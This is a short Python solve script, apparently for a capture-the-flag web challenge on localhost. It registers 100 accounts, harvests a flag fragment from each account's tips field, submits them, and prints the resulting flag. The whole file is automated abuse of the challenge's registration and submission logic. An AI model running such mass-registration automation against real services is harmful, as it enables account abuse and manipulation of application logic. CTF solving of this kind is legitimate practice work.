#!/usr/bin/env python3

import requests
from tqdm import trange
import re

target = "http://localhost:7777"

def register(username: str, password: str):
    headers = {"Content-Type": "application/json"}
    data = {"username": username, "password": password}
    req = requests.post(target + '/api/register', headers=headers, json=data)

def get_info_tip(username: str, password: str):
    s = requests.Session()
    headers = {"Content-Type": "application/json"}
    data = {"username": username, "password": password}
    req = s.post(target + '/api/login', headers=headers, json=data)
    req = s.get(target + '/api/user')
    flag = req.json()['tips'].split('\n')[-1]
    return flag

def submit(flag: str):
    headers = {"Content-Type": "application/json"}
    data = {"flag": flag}
    requests.post(target + '/submit', headers=headers, json=data)

def get_flag():
    req = requests.get(target + '/submit')
    #found = re.search(r"mireactf{[a-z0-9\-]+}", req.text).group()
    found = re.search(r"flag{[a-z0-9\-]+}", req.text).group()
    return found

for i in trange(100):
    register(str(i), str(i))
    flag = get_info_tip(str(i), str(i))
    submit(flag)

flag = get_flag()
print("[+] Flag: " + flag)
